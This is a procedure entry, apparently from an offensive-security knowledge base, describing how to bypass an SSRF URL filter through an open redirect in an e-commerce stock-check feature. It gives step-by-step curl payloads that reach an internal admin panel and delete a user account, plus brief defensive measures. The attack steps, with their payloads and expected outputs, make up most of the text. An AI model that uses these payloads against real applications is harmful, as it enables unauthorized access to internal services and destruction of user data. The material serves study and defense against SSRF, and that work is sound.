---
id: 1f299e01-171d-4be7-9ce0-37e06aa57a6a
name: SSRF-Filter-Bypass-Via-Open-Redirection
type: procedure
verified: true
submitted: true
created_at: '2020-08-17T16:11:51.392583+00:00'
updated_at: '2023-05-26T01:05:37.268037+00:00'
platforms:
  - Web
tags:
  - '[[tags/Open Redirection]]'
  - '[[tags/SSRF]]'
  - '[[tags/Web Applications]]'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
commands:
  - '[[commands/curl-initial-stock-check]]'
  - '[[commands/curl-ssrf-open-redirect]]'
  - '[[commands/curl-ssrf-admin-delete]]'
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# SSRF-Filter-Bypass-Via-Open-Redirection

## Summary

This procedure demonstrates how to bypass URL filters in a stock checking feature of a web application by chaining an open redirection vulnerability, enabling Server-Side Request Forgery (SSRF) to access internal administrative interfaces and perform unauthorized actions such as user deletion.

## Description

In vulnerable web applications, the stock checking functionality may validate URLs against blocklists but fail to prevent open redirections, allowing attackers to craft requests that redirect the server to internal resources. This technique exploits the trust in the application's own redirects to bypass filters, leading to SSRF. The attack targets applications with features like product stock APIs that fetch external resources, such as e-commerce sites. Success allows access to internal endpoints like admin panels, potentially enabling data exfiltration, modification, or deletion. This maps to MITRE ATT&CK technique T1190 (Exploit Public-Facing Application) under tactic TA0001 (Initial Access).

## Requirements

1. Access to a vulnerable web application with a stock checking feature that accepts URL parameters.
2. Network access to the target application (e.g., via browser or proxy).
3. Burp Suite or similar proxy tool for intercepting and modifying HTTP requests.
4. Knowledge of an open redirection vulnerability in the application (e.g., in /product/nextProduct).
5. Attacker-controlled server or internal IP reachable by the target (e.g., 192.168.0.12:8080 for admin simulation).

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation and whitelisting for all inbound parameters, blocking internal IPs and open redirects.
- Use network segmentation to isolate internal services from public-facing applications.
- Monitor server logs for unusual outbound requests to internal endpoints or unexpected HTTP status codes from redirects.
- Enable Web Application Firewall (WAF) rules to detect SSRF patterns, such as repeated redirects or access to localhost/admin paths.

## Objectives

1. Intercept and analyze the initial stock check request to identify modifiable parameters.
2. Bypass URL filters using open redirection to force SSRF to internal admin interfaces.
3. Access and manipulate internal resources, such as deleting user accounts via the admin endpoint.

## Instructions

### Step 1: Intercept Initial Stock Check Request

**Context**: Begin by navigating to the product page and triggering the stock check to capture the baseline request structure, identifying the stockApi parameter that controls the resource fetch.

**Command** ([[commands/curl-initial-stock-check]]):
```bash
curl -X POST 'https://target.com/product/stockApi' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'stockApi=https://target.com/product/stock?productId=1&storeId=1'
```

> This command simulates the initial POST request to the stock API. Use Burp Suite to intercept a real browser request for accuracy. Expected output includes a JSON response with stock details or an HTTP 200 status if successful. Verify the stockApi parameter is present and not heavily filtered.

### Step 2: Craft SSRF Payload with Open Redirection Bypass

**Context**: Modify the stockApi parameter to exploit the open redirection in /product/nextProduct, redirecting the server to an internal admin interface while bypassing any URL blocklists that prevent direct internal access.

**Command** ([[commands/curl-ssrf-open-redirect]]):
```bash
curl -X POST 'https://target.com/product/stockApi' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin'
```

> Submit this modified request via Burp Repeater. The application should follow the redirect, fetching the internal admin page. Expected output: The response body contains the admin interface HTML or a successful fetch indication (e.g., HTTP 200 with admin content). If blocked, adjust the path to match the exact open redirect endpoint.

### Step 3: Execute Unauthorized Action via SSRF

**Context**: Once SSRF is confirmed, extend the payload to perform destructive actions on the internal admin endpoint, such as deleting a target user account.

**Command** ([[commands/curl-ssrf-admin-delete]]):
```bash
curl -X POST 'https://target.com/product/stockApi' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos'
```

> Resubmit via Burp, observing the server's internal request to the delete endpoint. Expected output: Confirmation of user deletion (e.g., HTTP 200 with success message) or the admin response indicating the action completed. Verify by checking if the user account is removed from the application.
